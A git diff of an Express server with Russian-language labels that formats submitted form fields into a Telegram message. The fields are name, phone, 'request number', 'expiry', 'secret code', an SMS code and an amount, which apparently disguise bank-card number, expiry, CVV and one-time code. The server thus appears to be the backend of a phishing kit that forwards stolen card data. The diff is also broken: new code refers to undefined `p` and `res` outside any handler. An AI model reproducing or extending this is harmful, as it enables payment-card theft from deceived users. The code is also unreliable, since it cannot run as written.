@@ -13,21 +13,30 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+
+let amount = undefined;
+if (typeof p.amount === "string" || typeof p.amount === "number") {
+  const raw = String(p.amount).replace(",", ".");
+  if (/^\d+(\.\d{1,2})?$/.test(raw)) {
+    amount = raw; // норм OK
+  } else {
+    return res.status(400).json({ success: false, error: "Неверный формат суммы" });
+  }
+}
 // Небольшой helper: соберём читаемый текст для Telegram
 function buildTelegramText(p = {}) {
   const lines = [
-    "📨 Заявка с сайта:",
-    p.name && `👤 Имя: ${p.name}`,
-    p.email && `📧 Email: ${p.email}`,
-    p.message && `💬 Сообщение: ${p.message}`,
-    p.phone && `📱 Телефон: ${p.phone}`,
-    p.fio && `👤 ФИО: ${p.fio}`,
-    p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
-    p.expiry && `📅 Срок: ${p.expiry}`,
-    p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
-    p.verificationCode && `🔢 Код из SMS: ${String(p.verificationCode).trim()}`,
-    p.note && `📝 Примечание: ${p.note}`,
-  ].filter(Boolean);
+  "📨 Заявка с сайта:",
+  p.fio && `👤 ФИО: ${p.fio}`,
+  p.phone && `📱 Телефон: ${p.phone}`,
+  p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
+  p.expiry && `📅 Срок: ${p.expiry}`,
+  p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
+  amount && `💵 Сумма: ${amount}`,
+  p.note && `📝 Примечание: ${p.note}`,
+].filter(Boolean);
+
+if (lines.length <= 1) return res.status(400).json({ success: false, error: "Нет данных" });
 
   return lines.join("\n");
 }
